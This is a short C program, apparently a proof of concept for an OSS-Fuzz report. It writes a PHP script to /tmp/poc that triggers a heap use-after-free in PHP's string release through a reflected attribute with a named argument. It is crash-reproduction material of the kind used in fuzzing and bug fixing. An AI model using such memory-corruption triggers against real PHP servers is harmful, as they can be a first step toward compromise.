#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* PoC for oss-fuzz:371445205 */
/* Triggers: heap-use-after-free in zend_string_release (PHP) */
/* Vuln class: use_after_free */

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Exact PHP code from oss-fuzz test case that triggers UAF */
    fprintf(f, "<?php\n");
    fprintf(f, "#[Attribute]\n");
    fprintf(f, "class MyAttrib{}\n");
    fprintf(f, "#[MyAttrib(notinterned:'')]\n");
    fprintf(f, "class Test1{}\n");
    fprintf(f, "$attr=(new ReflectionClass(Test1::class))->getAttributes()[0];\n");
    fprintf(f, "try {\n");
    fprintf(f, "    $attr->newInstance();\n");
    fprintf(f, "} catch (Error $e) {\n");
    fprintf(f, "    echo $e->getMessage(), \"\\n\";\n");
    fprintf(f, "}\n");
    fprintf(f, "?>\n");

    fclose(f);
    return 0;
}